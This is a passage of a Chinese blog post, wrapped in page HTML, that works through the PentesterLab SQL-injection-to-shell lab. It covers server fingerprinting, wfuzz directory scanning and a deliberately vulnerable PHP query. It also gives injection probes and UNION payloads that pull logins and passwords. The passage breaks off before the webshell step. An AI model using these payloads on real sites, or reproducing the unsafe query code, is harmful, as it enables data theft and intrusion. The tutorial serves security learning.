@@ -1,0 +1,805 @@
+<!DOCTYPE html>
+<html>
+<head>
+    
+
+    
+
+    
+
+
+
+    <meta charset="utf-8">
+    
+    
+    
+    
+    <title>From SQL Injection to Shell | 喵喵喵喵 | 某鱼唇的人类</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    
+    <meta name="theme-color" content="#66CCFF">
+    
+    
+    <meta name="keywords" content="Pentesterlab">
+    <meta name="description" content="简介课程内容：基于PHP的站点的SQL注入，攻击者可以使用它来访问管理页面。然后，使用该访问，攻击者就能获得服务器上的代码执行。   攻击分为3个步骤：   指纹识别：收集Web应用的技术信息。  SQL注入检测和利用：在这一部分中，您将学习SQL注入的原理和如何利用它们来获取信息。  访问管理页面和代码执行：最后一步，您将访问操作系统和运行命令。    指纹识别指纹识别可以通过使用多个工具。首先">
+<meta property="og:type" content="article">
+<meta property="og:title" content="From SQL Injection to Shell">
+<meta property="og:url" content="https://darkwing.moe/2015/03/16/From-SQL-Injection-to-Shell/index.html">
+<meta property="og:site_name" content="喵喵喵喵">
+<meta property="og:description" content="简介课程内容：基于PHP的站点的SQL注入，攻击者可以使用它来访问管理页面。然后，使用该访问，攻击者就能获得服务器上的代码执行。   攻击分为3个步骤：   指纹识别：收集Web应用的技术信息。  SQL注入检测和利用：在这一部分中，您将学习SQL注入的原理和如何利用它们来获取信息。  访问管理页面和代码执行：最后一步，您将访问操作系统和运行命令。    指纹识别指纹识别可以通过使用多个工具。首先">
+<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/old_images/master/2015031601.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/old_images/master/2015031602.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/old_images/master/2015031603.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/old_images/master/2015031604.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/old_images/master/2015031605.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/old_images/master/2015031606.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/old_images/master/2015031607.png">
+<meta property="article:published_time" content="2015-03-16T07:11:07.000Z">
+<meta property="article:modified_time" content="2019-08-28T07:12:13.358Z">
+<meta property="article:author" content="暗羽">
+<meta property="article:tag" content="Pentesterlab">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/zjicmDarkWing/old_images/master/2015031601.png">
+    
+        <link rel="alternate" type="application/atom+xml" title="喵喵喵喵" href="/atom.xml">
+    
+    <link rel="shortcut icon" href="/favicon.ico">
+    <link rel="stylesheet" href="//unpkg.com/hexo-theme-material-indigo@latest/css/style.css">
+    <script>window.lazyScripts=[]</script>
+
+    <!-- custom head -->
+    
+
+<meta name="generator" content="Hexo 4.2.0"></head>
+
+<body>
+    <div id="loading" class="active"></div>
+
+    <aside id="menu" class="hide" >
+  <div class="inner flex-row-vertical">
+    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
+        <i class="icon icon-lg icon-close"></i>
+    </a>
+    <div class="brand-wrap" style="background-image:url(/img/brand.jpg)">
+      <div class="brand">
+        <a href="/" class="avatar waves-effect waves-circle waves-light">
+          <img src="/img/avatar.jpg">
+        </a>
+        <hgroup class="introduce">
+          <h5 class="nickname">暗羽</h5>
+          <a href="mailto:1126955201@qq.com" title="1126955201@qq.com" class="mail">1126955201@qq.com</a>
+        </hgroup>
+      </div>
+    </div>
+    <div class="scroll-wrap flex-col">
+      <ul class="nav">
+        
+            <li class="waves-block waves-effect">
+              <a href="/"  >
+                <i class="icon icon-lg icon-home"></i>
+                主页
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/archives"  >
+                <i class="icon icon-lg icon-archives"></i>
+                Archives
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/tags"  >
+                <i class="icon icon-lg icon-tags"></i>
+                Tags
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/categories"  >
+                <i class="icon icon-lg icon-th-list"></i>
+                Categories
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="https://github.com/zjicmDarkWing" target="_blank" >
+                <i class="icon icon-lg icon-github"></i>
+                Github
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="https://www.weibo.com/zjicmDarkWing" target="_blank" >
+                <i class="icon icon-lg icon-weibo"></i>
+                Weibo
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="https://twitter.com/darkwing_nya" target="_blank" >
+                <i class="icon icon-lg icon-gratipay"></i>
+                网恋选我我超甜
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/links"  >
+                <i class="icon icon-lg icon-link"></i>
+                一些链接
+              </a>
+            </li>
+        
+      </ul>
+    </div>
+  </div>
+</aside>
+
+    <main id="main">
+        <header class="top-header" id="header">
+    <div class="flex-row">
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light on" id="menu-toggle">
+          <i class="icon icon-lg icon-navicon"></i>
+        </a>
+        <div class="flex-col header-title ellipsis">From SQL Injection to Shell</div>
+        
+        <div class="search-wrap" id="search-wrap">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
+                <i class="icon icon-lg icon-chevron-left"></i>
+            </a>
+            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="検索">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search">
+                <i class="icon icon-lg icon-search"></i>
+            </a>
+        </div>
+        
+        
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menuShare">
+            <i class="icon icon-lg icon-share-alt"></i>
+        </a>
+        
+    </div>
+</header>
+<header class="content-header post-header">
+
+    <div class="container fade-scale">
+        <h1 class="title">From SQL Injection to Shell</h1>
+        <h5 class="subtitle">
+            
+                <time datetime="2015-03-16T07:11:07.000Z" itemprop="datePublished" class="page-time">
+  2015-03-16
+</time>
+
+
+	<ul class="article-category-list"><li class="article-category-list-item"><a class="article-category-list-link" href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">学习笔记</a></li></ul>
+
+            
+        </h5>
+    </div>
+
+    
+
+
+</header>
+
+
+<div class="container body-wrap">
+    
+    <aside class="post-widget">
+        <nav class="post-toc-wrap post-toc-shrink" id="post-toc">
+            <h4>TOC</h4>
+            <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#简介"><span class="post-toc-number">1.</span> <span class="post-toc-text">简介</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#指纹识别"><span class="post-toc-number">2.</span> <span class="post-toc-text">指纹识别</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#检查HTTP头部信息"><span class="post-toc-number">2.1.</span> <span class="post-toc-text">检查HTTP头部信息</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#使用目录扫描"><span class="post-toc-number">2.2.</span> <span class="post-toc-text">使用目录扫描</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#SQL注入检测"><span class="post-toc-number">3.</span> <span class="post-toc-text">SQL注入检测</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#SQL入门"><span class="post-toc-number">3.1.</span> <span class="post-toc-text">SQL入门</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#基于整数检测"><span class="post-toc-number">3.2.</span> <span class="post-toc-text">基于整数检测</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#基于字符串检测"><span class="post-toc-number">3.3.</span> <span class="post-toc-text">基于字符串检测</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#SQL注入利用"><span class="post-toc-number">4.</span> <span class="post-toc-text">SQL注入利用</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#UNION关键字"><span class="post-toc-number">4.1.</span> <span class="post-toc-text">UNION关键字</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#使用UNION利用SQL注入"><span class="post-toc-number">4.2.</span> <span class="post-toc-text">使用UNION利用SQL注入</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#检索信息"><span class="post-toc-number">4.3.</span> <span class="post-toc-text">检索信息</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#访问管理页面和代码执行"><span class="post-toc-number">5.</span> <span class="post-toc-text">访问管理页面和代码执行</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#破解密码"><span class="post-toc-number">5.1.</span> <span class="post-toc-text">破解密码</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#上传WebShell并且执行代码"><span class="post-toc-number">5.2.</span> <span class="post-toc-text">上传WebShell并且执行代码</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#总结"><span class="post-toc-number">6.</span> <span class="post-toc-text">总结</span></a></li></ol>
+        </nav>
+    </aside>
+
+
+<article id="post-From-SQL-Injection-to-Shell"
+  class="post-article article-type-post fade" itemprop="blogPost">
+
+    <div class="post-card">
+        <h1 class="post-card-title">From SQL Injection to Shell</h1>
+        <div class="post-meta">
+            <time class="post-time" title="2015-03-16 15:11:07" datetime="2015-03-16T07:11:07.000Z"  itemprop="datePublished">2015-03-16</time>
+
+            
+	<ul class="article-category-list"><li class="article-category-list-item"><a class="article-category-list-link" href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">学习笔记</a></li></ul>
+
+
+
+            
+<span id="busuanzi_container_page_pv" title="文章总阅读量" style='display:none'>
+    <i class="icon icon-eye icon-pr"></i><span id="busuanzi_value_page_pv"></span>
+</span>
+
+
+        </div>
+        <div class="post-content" id="post-content" itemprop="postContent">
+            <h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>课程内容：基于PHP的站点的SQL注入，攻击者可以使用它来访问管理页面。<br>然后，使用该访问，攻击者就能获得服务器上的代码执行。  </p>
+<p>攻击分为3个步骤： </p>
+<ul>
+<li>指纹识别：收集Web应用的技术信息。 </li>
+<li>SQL注入检测和利用：在这一部分中，您将学习SQL注入的原理和如何利用它们来获取信息。 </li>
+<li>访问管理页面和代码执行：最后一步，您将访问操作系统和运行命令。  </li>
+</ul>
+<h1 id="指纹识别"><a href="#指纹识别" class="headerlink" title="指纹识别"></a>指纹识别</h1><p>指纹识别可以通过使用多个工具。首先通过使用浏览器，将有可能检测到该应用程序是用PHP写的。</p>
+<h2 id="检查HTTP头部信息"><a href="#检查HTTP头部信息" class="headerlink" title="检查HTTP头部信息"></a>检查HTTP头部信息</h2><p>大量的信息可以通过使用telnet或netcat连接到远程Web应用程序获取：  </p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> telnet vulnerable 80</span></span><br></pre></td></tr></table></figure>
+
+<p>PS：  </p>
+<ul>
+<li>vulnerable是主机名或服务器的IP地址；  </li>
+<li>80是由Web应用程序使用的TCP端口（80是HTTP默认值）。  </li>
+</ul>
+<p>通过发送以下HTTP请求：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: vulnerable</span><br></pre></td></tr></table></figure>
+
+<p>它有可能获取到PHP版本和Web服务器信息，仅仅通过观察服务器发送回的HTTP响应报头的：  </p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 <span class="number">200</span> OK</span><br><span class="line"><span class="attribute">Date</span>: Thu, 24 Nov 2011 04:40:51 GMT</span><br><span class="line"><span class="attribute">Server</span>: Apache/2.2.16 (Debian)</span><br><span class="line"><span class="attribute">X-Powered-By</span>: PHP/5.3.3-7+squeeze3</span><br><span class="line"><span class="attribute">Vary</span>: Accept-Encoding</span><br><span class="line"><span class="attribute">Content-Length</span>: 1335</span><br><span class="line"><span class="attribute">Content-Type</span>: text/html</span><br></pre></td></tr></table></figure>
+
+<p>这里的应用程序只能通过HTTP（没有运行在端口443）。如果应用程序只能通过HTTPS，telnet或netcat就无法与服务器进行通信，可以使用<strong>openssl</strong>工具：  </p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> openssl s_client -connect vulnerable:443</span></span><br></pre></td></tr></table></figure>
+
+<p>PS：  </p>
+<ul>
+<li>vulnerable是主机名或服务器的IP地址；  </li>
+<li>443是由Web应用程序使用的TCP端口（443是HTTPS的默认值）。  </li>
+</ul>
+<p>使用应用程序如Burp Suite（<a href="http://portswigger.net/" target="_blank" rel="noopener" title="http://portswigger.net/">http://portswigger.net/</a>）设置为代理可以很容易地获取相同的信息：  </p>
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/old_images/master/2015031601.png" alt=""></p>
+<h2 id="使用目录扫描"><a href="#使用目录扫描" class="headerlink" title="使用目录扫描"></a>使用目录扫描</h2><p>wfuzz工具（<a href="http://www.edge-security.com/wfuzz.php" target="_blank" rel="noopener" title="http://www.edge-security.com/wfuzz.php">http://www.edge-security.com/wfuzz.php</a>）可以用来暴力检测Web服务器上的目录和页面。<br>下面的命令可以检测远程文件和目录：  </p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> python wfuzz.py -z file -f commons.txt --hc 404 http://vulnerable/FUZZ</span></span><br></pre></td></tr></table></figure>
+
+<p>使用以下选项：  </p>
+<ul>
+<li><strong>–hc 404</strong> 告诉wfuzz如果响应代码404则忽略响应（页面未找到）  </li>
+<li><strong>-z file -f wordlists/big.txt</strong> 告诉wfuzz文件使用文件 wordlists/big.txt 作为字典破解远程目录的名称。  </li>
+<li><strong><a href="http://vulnerable/FUZZ" target="_blank" rel="noopener">http://vulnerable/FUZZ</a></strong> 告诉wfuzz在URL中替换 <strong>FUZZ</strong> 的每个在字典中找到的值。  </li>
+</ul>
+<p>wfuzz也可以用来检测服务器上的PHP脚本：  </p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> python wfuzz.py -z file -f commons.txt --hc 404 http://vulnerable/FUZZ.php</span></span><br></pre></td></tr></table></figure>
+
+<h1 id="SQL注入检测"><a href="#SQL注入检测" class="headerlink" title="SQL注入检测"></a>SQL注入检测</h1><h2 id="SQL入门"><a href="#SQL入门" class="headerlink" title="SQL入门"></a>SQL入门</h2><p>为了理解，检测和利用SQL注入，你需要了解标准查询语言（SQL）。SQL允许开发人员执行以下需求：  </p>
+<ul>
+<li>使用 <strong>SELECT</strong> 语句检索信息；  </li>
+<li>使用 <strong>UPDATE</strong> 语句更新信息；  </li>
+<li>使用 <strong>INSERT</strong> 语句添加新的信息；  </li>
+<li>使用 <strong>DELETE</strong> 语句删除信息。<br>更多的操作（创建/删除/修改表，数据库或触发器）是可用的但不太可能被用于Web应用程序。  </li>
+</ul>
+<p>网站最常用的查询语句是 <strong>SELECT</strong> ，用于从数据库中检索信息。 <strong>SELECT</strong> 语句的语法如下：  </p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> column1, column2, column3 <span class="keyword">FROM</span> table1 <span class="keyword">WHERE</span> column4=<span class="string">'string1'</span> <span class="keyword">AND</span> column5=integer1 <span class="keyword">AND</span> column6=integer2;</span><br></pre></td></tr></table></figure>
+
+<p>在该查询中，以下信息提供给数据库：  </p>
+<ul>
+<li>SELECT语句表示要执行的操作：检索信息；  </li>
+<li>列的列表显示哪些列被请求；  </li>
+<li><strong>FROM table1</strong> 表示从哪一个表获取记录；  </li>
+<li>语句之后的 <strong>WHERE</strong> 是用来指示记录应满足什么条件。<br><strong>string1</strong> 的值是由单引号限定，整数 <strong>integer1</strong> 和 <strong>integer2</strong> 可以通过一个单引号分隔（ <strong>integer2</strong> ）或直接放在查询中（ <strong>integer1</strong> ）。  </li>
+</ul>
+<p>例如下面的请求：  </p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> column1, column2, column3 <span class="keyword">FROM</span> table1 <span class="keyword">WHERE</span> column4=<span class="string">'user'</span> <span class="keyword">AND</span> column5=<span class="number">3</span> <span class="keyword">AND</span> column6=<span class="number">4</span>;</span><br></pre></td></tr></table></figure>
+
+<p>会从下面的表中检索：  </p>
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/old_images/master/2015031602.png" alt=""></p>
+<p>使用之前的查询语句，下面的结果将被检索：  </p>
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/old_images/master/2015031603.png" alt=""></p>
+<p>我们可以看到，只有这些值被返回，因为它们是匹配所有 <strong>WHERE</strong> 中的声明条件。<br>如果你阅读一些处理数据库的源代码，你会经常看到 <strong>SELECT * FROM tablename</strong> 。 * 是一个通配符请求数据库返回所有列并避免指明它们的名称。  </p>
+<h2 id="基于整数检测"><a href="#基于整数检测" class="headerlink" title="基于整数检测"></a>基于整数检测</h2><p>由于显示错误信息，很容易检测到网站的任何漏洞。SQL注入可以使用任何下列方法检测。<br>所有这些方法都是基于数据库的一般行为，发现和利用SQL注入取决于很多不同的因素，这些方法本身并不是100%的可靠。这就是为什么你需要尝试它们中的几种去确定给定的参数是存在漏洞的。<br>让我们以一个购物网站为例子，访问的URL /cat.php?id=1，你会看到图片article1。下表显示你会看到的不同的ID值：  </p>
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/old_images/master/2015031604.png" alt=""></p>
+<p>后台的PHP代码如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$id = $_GET[<span class="string">"id"</span>];</span><br><span class="line">$result= mysql_query(<span class="string">"SELECT * FROM articles WHERE id="</span>.$id);</span><br><span class="line">$row = mysql_fetch_assoc($result);</span><br><span class="line"><span class="comment">// ... display of an article from the query result ...</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>用户提供的值（ <strong>$_GET[“id]</strong> ）被直接用于SQL请求语句中。例如，访问的URL：  </p>
+<ul>
+<li><p><strong>/article.php?id=1</strong> 将产生以下请求： <strong>SELECT * FROM articles WHERE id=1</strong>  </p>
+</li>
+<li><p><strong>/article.php?id=2</strong> 将产生以下请求： <strong>SELECT * FROM articles WHERE id=2</strong><br>如果用户试图访问URL <strong>/article.php?id=2&#39;</strong> ，下列请求将被执行 <strong>SELECT * FROM articles WHERE id=2&#39;</strong> 。然而，这个SQL请求因为单引号，语法错误，数据库将抛出一个错误。例如，MySQL会抛出如下错误信息：  </p>
+<p>You have an error in your SQL syntax; check the<br>manual that corresponds to your MySQL server<br>version for the right syntax to use near<br>&#39;&#39;&#39; at line 1 </p>
+</li>
+</ul>
+<p>此错误消息是否在HTTP响应中可见取决于PHP配置。  </p>
+<p>在URL中提供的值是直接用于请求语句并且被视为一个整数，这允许你查询数据库并且执行基本的数学运算：  </p>
+<ul>
+<li>如果你试图访问 <strong>/article.php?id=2-1</strong> ，下面的请求将被发送到数据库 <strong>SELECT * FROM articles WHERE id=2-1</strong> ，并且article1的信息将在网页上显示，因为这次查询等价于 <strong>SELECT * FROM articles WHERE id=1</strong> （减法将由数据库自动执行）。  </li>
+<li>如果你试图访问 <strong>/article.php?id=2-0</strong> ，下面的请求将被发送到数据库 <strong>SELECT * FROM articles WHERE id=2-0</strong> ，并且article2的信息将在网页上显示，因为这次查询等价于 <strong>SELECT * FROM articles WHERE id=2</strong> 。  </li>
+</ul>
+<p>这些特性提供了一个很好的检测SQL注入的方法：  </p>
+<ul>
+<li>如果访问 <strong>/article.php?id=2-1</strong> 显示article1并且访问 <strong>/article.php?id=2-0</strong> 显示article2，减法是由数据库来完成的，那么你可能发现了一个SQL注入。  </li>
+<li>如果访问 <strong>/article.php?id=2-1</strong> 显示article2并且访问 <strong>/article.php?id=2-0</strong> 也显示article2，你可能没有一个基于整数的SQL注入，但你可能有一个基于字符串的SQL注入，正如我们将看到的。  </li>
+<li>如果你把一个引号放入URL中（ <strong>/article.php?id=1&#39;</strong> ），你应该收到一个错误。  </li>
+</ul>
+<p>如果一个值是一个整数（例如categorie.php?id=1），它可以被当作字符串用于SQL语句中：<br>SELECT * FROM categories where id=&#39;1&#39;.<br>这是SQL允许使用的语法，但在SQL语句中使用字符串会比使用整数慢。  </p>
+<h2 id="基于字符串检测"><a href="#基于字符串检测" class="headerlink" title="基于字符串检测"></a>基于字符串检测</h2><p>正如我们之前在“SQL入门”中看到的，SQL语句中的字符串值被放在引号当中（例如&#39;test&#39;）：  </p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">id</span>,<span class="keyword">name</span> <span class="keyword">FROM</span> <span class="keyword">users</span> <span class="keyword">where</span> <span class="keyword">name</span>=<span class="string">'test'</span>;</span><br></pre></td></tr></table></figure>
+
+<p>如果SQL注入是在网页中，注入一个单引号 <strong>&#39;</strong> 将打破查询语法并且产生错误。另外，注入2次单引号 <strong>&#39; &#39;</strong> 不会打破查询。作为一般规则，奇数单引号将抛出一个错误，偶数单引号不会。  </p>
+<p>它也可以注释掉查询语句的末尾，因此在大多数情况下，你不会得到一个错误（这取决于查询的格式）。你可以用 <strong>&#39;–</strong> 来注释掉末尾。  </p>
+<p>例如下面的查询，在test处有一个注入点：  </p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">id</span>,<span class="keyword">name</span> <span class="keyword">FROM</span> <span class="keyword">users</span> <span class="keyword">where</span> <span class="keyword">name</span>=<span class="string">'test'</span> <span class="keyword">and</span> <span class="keyword">id</span>=<span class="number">3</span>;</span><br></pre></td></tr></table></figure>
+
+<p>会变成：  </p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">id</span>,<span class="keyword">name</span> <span class="keyword">FROM</span> <span class="keyword">users</span> <span class="keyword">where</span> <span class="keyword">name</span>=<span class="string">'test'</span> <span class="comment">-- ' and id=3;</span></span><br></pre></td></tr></table></figure>
+
+<p>并且会被解释为：  </p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">id</span>,<span class="keyword">name</span> <span class="keyword">FROM</span> <span class="keyword">users</span> <span class="keyword">where</span> <span class="keyword">name</span>=<span class="string">'test'</span></span><br></pre></td></tr></table></figure>
+
+<p>然而这个测试仍然可能产生一个错误，如果查询如下模式：  </p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">id</span>,<span class="keyword">name</span> <span class="keyword">FROM</span> <span class="keyword">users</span> <span class="keyword">where</span> ( <span class="keyword">name</span>=<span class="string">'test'</span> <span class="keyword">and</span> <span class="keyword">id</span>=<span class="number">3</span> );</span><br></pre></td></tr></table></figure>
+
+<p>由于右括号会因为末尾的注释而消失。你可以尝试一个或多个括号来查找一个值使它不会产生错误。  </p>
+<p>另一种方式来测试它，是使用 <strong>&#39; and &#39;1&#39;=&#39;1</strong> ，这种注入不太可能影响查询，因为它不太可能打破语法。例如，在之前的查询中采用这种方式注入，我们可以看到语法仍然是正确的。  </p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">id</span>,<span class="keyword">name</span> <span class="keyword">FROM</span> <span class="keyword">users</span> <span class="keyword">where</span> ( <span class="keyword">name</span>=<span class="string">'test'</span> <span class="keyword">and</span> <span class="string">'1'</span>=<span class="string">'1'</span> <span class="keyword">and</span> <span class="keyword">id</span>=<span class="number">3</span> );</span><br></pre></td></tr></table></figure>
+
+<p>此外， <strong>&#39; and &#39;1&#39;=&#39;1</strong> 不太可能影响的请求和结果，因为有没有注入的语义可能是相同的。我们可以通过使用注入 <strong>&#39; and &#39;1&#39;=&#39;0</strong> 产生的页面来与它比较，虽然并没有产生错误，但改变了查询的语义。<br>SQL注入并不是一门精确的科学，很多东西都会影响到你的测试结果。如果你遇到这些，继续测试注入，尝试测试出后台代码来确认它是一个SQL注入。<br>为了找到SQL注入，你需要访问网站并且使用这些方法测试每一个页面的每一个参数。一旦你发现了SQL注入，你可以到下一节去学习如何利用它。</p>
+<h1 id="SQL注入利用"><a href="#SQL注入利用" class="headerlink" title="SQL注入利用"></a>SQL注入利用</h1><p>现在我们网页  <strong><a href="http://vulnerable/cat.php" target="_blank" rel="noopener">http://vulnerable/cat.php</a></strong> 发现了一个SQL注入，为了更进一步，我们需要利用它来检索信息。为此，我们需要了解SQL中使用的 <strong>UNION</strong> 关键字。  </p>
+<h2 id="UNION关键字"><a href="#UNION关键字" class="headerlink" title="UNION关键字"></a>UNION关键字</h2><p> <strong>UNION</strong> 声明是用来把两次请求的信息放在一起：  </p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> articles <span class="keyword">WHERE</span> <span class="keyword">id</span>=<span class="number">3</span> <span class="keyword">UNION</span> <span class="keyword">SELECT</span> ...</span><br></pre></td></tr></table></figure>
+
+<p>因为它是用来从其他表中检索信息，它可以用来作为一个SQL注入的有效载荷。请求的开始不能被攻击者直接修改，因为它是由PHP代码生成的。然而使用UNION，攻击者可以操纵查询的结束并且从其他表中检索信息：  </p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">id</span>,<span class="keyword">name</span>,price <span class="keyword">FROM</span> articles <span class="keyword">WHERE</span> <span class="keyword">id</span>=<span class="number">3</span>  </span><br><span class="line"><span class="keyword">UNION</span> <span class="keyword">SELECT</span> <span class="keyword">id</span>,login,<span class="keyword">password</span>  <span class="keyword">FROM</span> <span class="keyword">users</span></span><br></pre></td></tr></table></figure>
+
+<p>最重要的规则是两次查询返回的列的类型相同，否则数据库将触发一个错误。  </p>
+<h2 id="使用UNION利用SQL注入"><a href="#使用UNION利用SQL注入" class="headerlink" title="使用UNION利用SQL注入"></a>使用UNION利用SQL注入</h2><p>使用UNION利用SQL注入遵循下面的步骤：  </p>
+<ol>
+<li>找出列数用来执行UNION  </li>
+<li>找出哪些列被显示在页面上  </li>
+<li>从元表数据库中检索信息  </li>
+<li>从其他表或数据库中检索信息  </li>
+</ol>
+<p>为了执行SQL注入的请求，你需要找到所查询的第一部分返回的列数。你需要猜这个数，除非你有应用程序的源代码。  </p>
+<p>有两种方法得到这个信息：  </p>
+<ul>
+<li>使用 <strong>UNION SELECT</strong> 和增加列数；  </li>
+<li>使用 <strong>ORDER BY</strong> 语句。  </li>
+</ul>
+<p>如果你尝试 <strong>UNION</strong> 并且两个查询返回的列数是不同的，数据库将抛出一个错误：  </p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">The used <span class="keyword">SELECT</span> statements have a different <span class="built_in">number</span> <span class="keyword">of</span> <span class="keyword">columns</span></span><br></pre></td></tr></table></figure>
+
+<p>可以使用这个属性来猜列数。例如，如果你可以注入以下语句： <strong>SELECT id,name,price FROM articles where id=1</strong> ，你可以采用以下步骤：  </p>
+<ul>
+<li><strong>SELECT id,name,price FROM articles where id=1 UNION SELECT</strong> 1 ,注入内容 <strong>1 UNION SELECT 1</strong> 将返回一个错误因为查询语句的两个子部分的列数是不同的；  </li>
+<li><strong>SELECT id,name,price FROM articles where id=1 UNION SELECT 1,2</strong> ，因为如上同样的原因，注入内容 <strong>1 UNION SELECT 1,2</strong> 会返回一个错误；  </li>
+<li><strong>SELECT id,name,price FROM articles where id=1 UNION SELECT 1,2,3</strong> ，因为两个子部分拥有相同的列数，此查询不会抛出错误。你甚至可以在页面或页面的源代码中，看到一个数字。  </li>
+</ul>
+<p>注：本项目为MySQL，使用的的方法与其他数据库略有不同，值1,2,3…应该改成null,null,null…,如果数据库要求 UNION 两边的部分相同的值类型。例如Oracle，当使用SELECT时需要使用FROM，可以使用dual表来完成请求： <strong>UNION SELECT null,null,null FROM dual</strong>   </p>
+<p>另一种方法是利用关键字 <strong>ORDER BY</strong> 。 <strong>ORDER BY</strong> 主要用来告诉数据库哪些列被用于排序结果：</p>
